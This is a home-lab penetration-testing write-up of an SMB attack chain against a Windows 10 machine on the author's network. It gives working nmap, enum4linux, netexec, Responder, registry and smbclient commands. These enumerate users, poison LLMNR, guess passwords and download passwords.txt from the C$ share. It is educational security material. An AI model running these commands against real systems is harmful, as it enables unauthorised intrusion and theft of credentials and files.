# Home Lab: Windows 10 — SMB Enumeration, User Discovery & File Exfiltration
**Date:** 2026-04-30  
**Attacker:** Kali Linux (`192.168.1.119`)  
**Target:** Windows 10 Home (`192.168.1.147` — `PC-MILLER`)  
**Objective:** Discover a locked Windows target on the network, enumerate SMB, escalate access, and exfiltrate files remotely.

---

## Setup

| Machine | OS | IP | Role |
|--------|----|----|------|
| Attacker | Kali Linux | `192.168.1.119` | Offensive |
| Target | Windows 10 Home | `192.168.1.147` | Victim |

**Target configuration:**
- Windows Firewall disabled manually after gaining physical access
- SMB 1.0 enabled
- `LocalAccountTokenFilterPolicy` registry key set to allow remote admin access

---

## Phase 1 — Network Discovery

```bash
nmap -sn 192.168.1.0/24 --open
```

Discovered live hosts. New machine appeared at `192.168.1.147` with an Intel Corporate NIC — suspect target.

<img width="660" height="636" alt="Screenshot 2026-05-03 131513" src="https://github.com/user-attachments/assets/b1d6f995-67be-4bd3-8013-a393734352eb" />


---

## Phase 2 — Target Identification

```bash
nmap -sV -p 135,139,445 192.168.1.147
```

Confirmed Windows machine with SMB ports open. Hostname: `PC-MILLER`.
<img width="672" height="322" alt="Screenshot 2026-05-03 133021" src="https://github.com/user-attachments/assets/f239f1d0-6b8d-4396-96a8-38b2faed0441" />



---

## Phase 3 — Full Port Scan

```bash
nmap -sV -sC -p- --min-rate 3000 192.168.1.147
```

Initial scan returned all ports as **filtered** — Windows Firewall was active. Physical access was required to disable it before continuing.

<img width="665" height="784" alt="Screenshot 2026-05-03 132717" src="https://github.com/user-attachments/assets/6b66f28e-eb19-4ad7-a504-90fd638f153a" />
<img width="668" height="242" alt="Screenshot 2026-05-03 132745" src="https://github.com/user-attachments/assets/0c85b2f1-b2c6-430b-9be5-845690c0e3ce" />


---

## Phase 4 — Vulnerability Check

```bash
nmap --script smb-vuln-ms17-010 192.168.1.147
```

Not vulnerable to EternalBlue. Windows 10 is patched.

<img width="678" height="285" alt="Screenshot 2026-05-03 133118" src="https://github.com/user-attachments/assets/781e2bcd-b707-48c5-859a-a9efdbd6eb18" />


---

## Phase 5 — SMB Enumeration

```bash
enum4linux -a 192.168.1.147
```

Discovered:
- Workgroup: `WORKGROUP`
- Computer name: `PC-MILLER`
- Users: `Miller`, `Soporte`, `Administrator`

<img width="734" height="619" alt="Screenshot 2026-05-03 133214" src="https://github.com/user-attachments/assets/68fc0f5b-5b6f-4caa-b213-381c84ced130" />


```bash
netexec smb 192.168.1.147 -u Miller -p '12345' --shares
```

Authenticated as Miller and enumerated shares:
- `ADMIN$` — Remote Admin
- `C$` — Default share (entire C drive)
- `D$` — Default share
- `IPC$` — Remote IPC (READ access)

<img width="742" height="618" alt="Screenshot 2026-05-03 133319" src="https://github.com/user-attachments/assets/56123727-070e-4111-a268-0cd89808b03f" />

```bash
netexec smb 192.168.1.147 -u Miller -p '12345' --rid-brute
```

Enumerated all users via RID brute force:
- `500` — Administrator
- `501` — Guest
- `1001` — Miller
- `1002` — Soporte


<img width="578" height="45" alt="Screenshot 2026-05-03 133350" src="https://github.com/user-attachments/assets/a2c2e544-ce5b-45e6-90b6-ab3651cfdb3d" />

---

## Phase 6 — Privilege Escalation Attempts (Failed)

### Test Administrator account

```bash
netexec smb 192.168.1.147 -u Administrator -p 'admin'
netexec smb 192.168.1.147 -u Administrator -p ''
```

Result: `STATUS_ACCOUNT_DISABLED` — Administrator account is disabled on this machine.

<img width="742" height="225" alt="image" src="https://github.com/user-attachments/assets/2010ee62-0b41-44cd-8883-071e5d193060" />




## Phase 7 — LLMNR Poisoning with Responder

```bash
responder -I eth0 -wv
```

Responder started poisoning the network. PC-MILLER immediately began broadcasting LLMNR requests for `PC-Miller.local` — visible in real time.

<img width="646" height="718" alt="image" src="https://github.com/user-attachments/assets/ebdb8194-c9b6-41bd-af6e-60000f4ca199" />
<img width="1892" height="721" alt="image" src="https://github.com/user-attachments/assets/effb667b-7501-4ea9-a6e3-147b83bde688" />



---

## Phase 8 — C Drive Access & File Exfiltration

After enabling `LocalAccountTokenFilterPolicy` on the target machine via the registry:

```bash
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

Connected to the C drive remotely:

```bash
smbclient '//192.168.1.147/C$' -U PC-MILLER/Miller%12345
```
<img width="706" height="307" alt="image" src="https://github.com/user-attachments/assets/f0b1a8fe-8b99-40fd-8b86-b6bd783a5efb" />


Full C drive contents visible.

Navigated to the target's Desktop and exfiltrated a file:

```bash
cd Users\Miller\Desktop
ls
get passwords.txt
```

File downloaded successfully to attacker machine.

<img width="676" height="176" alt="image" src="https://github.com/user-attachments/assets/430a75b2-43ea-420f-841f-62c00a3bda46" />
<img width="736" height="54" alt="image" src="https://github.com/user-attachments/assets/fb14c2c1-4873-455e-b50d-7d6cd162c808" />
<img width="140" height="112" alt="image" src="https://github.com/user-attachments/assets/849029c2-0f86-4cc4-863c-b1f72b4f4ca0" />
<img width="447" height="181" alt="image" src="https://github.com/user-attachments/assets/c75b4370-dfe5-4065-ae90-47242d257b65" />


---

## Attack Chain Summary

| Step | Tool | Technique | Result |
|------|------|-----------|--------|
| Network discovery | nmap | ICMP sweep | Found PC-MILLER at .147 |
| Target ID | nmap | SMB port scan | Confirmed Windows 10 |
| Vuln check | nmap | MS17-010 script | Not vulnerable |
| Firewall bypass | physical access | Manual disable | Ports opened |
| SMB enumeration | enum4linux | SMB enum | Found users |
| Share enumeration | netexec | --shares | Found C$, ADMIN$ |
| User enumeration | netexec | --rid-brute | All accounts listed |
| Admin escalation | netexec | Password guessing | Failed (account disabled) |
| LLMNR poisoning | Responder | Network poisoning | Active poisoning confirmed |
| RCE attempt | netexec | -x command | Failed (insufficient privileges) |
| Registry fix | physical access | LocalAccountTokenFilterPolicy | Enabled remote admin |
| C drive access | smbclient | SMB file browse | Full C drive listed |
| File exfiltration | smbclient | get command | passwords.txt downloaded |

---

## Key Concepts

**RID Brute Force** . Windows assigns every user a Relative Identifier (RID). By brute forcing RID numbers via SMB, you can enumerate all local accounts on a machine even without admin access.

**LocalAccountTokenFilterPolicy** . By default, Windows 10 strips admin tokens from remote SMB sessions for local accounts. Setting this registry key to `1` restores full admin access for remote connections, a common misconfiguration in enterprise environments.

**SMB C$ Share** . Every Windows machine has hidden administrative shares like `C$` that map directly to the C drive root. If an attacker can authenticate with admin credentials, they can browse and exfiltrate any file on the system.

**Firewall as a Real Barrier** . This lab demonstrated that a firewall genuinely blocks remote attacks. Without physical access to disable it, none of the remote techniques would have worked. In real engagements, firewall bypass requires different techniques like phishing or social engineering.

---

## Note to Self

Remote command execution failed because Miller did not have sufficient privileges by default, and the Administrator account was disabled. In a real engagement without physical access, the next steps would be:

- Attempt SMB relay instead of just capturing hashes
- Look for other services (RDP, WinRM) that may allow remote execution
- Use OSINT to build a better custom wordlist for Soporte's account
- Explore privilege escalation paths from a low-privilege SMB session

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network scanning, service detection, vuln scripts |
| `enum4linux` | SMB enumeration, user discovery |
| `responder` | LLMNR/NBT-NS poisoning |
| `netexec` | SMB authentication, share/user enumeration, RCE attempt |
| `smbclient` | SMB file system access and exfiltration |

---

*Lab performed on isolated home network for educational purposes only.*
